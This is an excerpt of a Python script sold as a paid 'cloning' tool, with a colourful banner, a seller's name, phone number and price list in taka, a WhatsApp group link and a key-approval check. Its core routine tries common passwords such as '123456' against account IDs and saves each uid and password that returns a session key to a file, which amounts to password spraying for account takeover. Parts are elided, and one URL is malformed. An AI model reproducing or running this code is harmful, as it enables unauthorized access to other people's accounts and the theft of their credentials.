#!/usr/bin/env python3
# KAMAL CLONER – SIR ROOHULAMIN EDITION (AES ENCRYPTED)
...
def banner():
    ...
    print("\033[1;33m" + " " * 18 + "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝" + " " * 18 + "\033[0m")
    print("\033[1;36m" + "█"*60 + "\033[0m")
    print("\033[1;32m" + " " * 12 + "💀 KAMAL PAID CLONING TOOL – AES ENCRYPTED 💀" + " " * 12 + "\033[0m")
    print("\033[1;36m" + "█"*60 + "\033[0m")
    print("\n")
...
def show_info():
    print("\033[1;36m" + "═"*60 + "\033[0m")
    print("\033[1;37m👤 Name   : \033[1;33mRaja Vau\033[0m")
    print("\033[1;37m📱 Number : \033[1;33m+8801736602421\033[0m")
    print("\033[1;36m" + "─"*60 + "\033[0m")
    print("\033[1;37m💰 PRICE LIST (Taka):\033[0m")
    print("\033[1;32m  3 Days  → 100 TK\033[0m")
    print("\033[1;33m  7 Days  → 300 TK\033[0m")
    print("\033[1;34m 15 Days  → 500 TK\033[0m")
    print("\033[1;35m 30 Days  → 1000 TK\033[0m")
    print("\033[1;36m" + "═"*60 + "\033[0m")
    print("\n")
...
def open_whatsapp():
    link = WHATSAPP_LINK
    print("\033[1;33m📲 Opening: \033[1;37m" + link + "\033[0m")
    try:
        subprocess.run(['xdg-open', link], check=True, timeout=5)
        print("\033[1;32m✅ Group opened in your browser\033[0m")
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        try:
            subprocess.run(['termux-open', link], check=True, timeout=5)
            print("\033[1;32m✅ Group opened\033[0m")
        except:
...
def check_approval(key):
    url = "https://raw.githubusercontent.com/https://raw.githubusercontent.com/Kingjillu/kt/main/key.txt"
    try:
...
def approval_flow():
    ...
    if choice == 'A':
        ...
        if check_approval(key):
            ...
            print("\033[1;33m💡 Make sure admin has added your key to Key.txt\033[0m")
            time.sleep(3)
            approval_flow()
    else:
        approval_flow()
    ...
    try:
        ...
        for pw in ('123456','1234567','12345678','123456789'):
            ...
            if 'session_key' in res:
                ...
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKAMAL-M1👿\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/KAMAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
...
def old_clone():
    banner()
    show_info()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m ALL SERIES')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m 100003/4 SERIES')
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m 2009 series')
    print('\033[1;36m' + '━'*50 + '\033[0m')
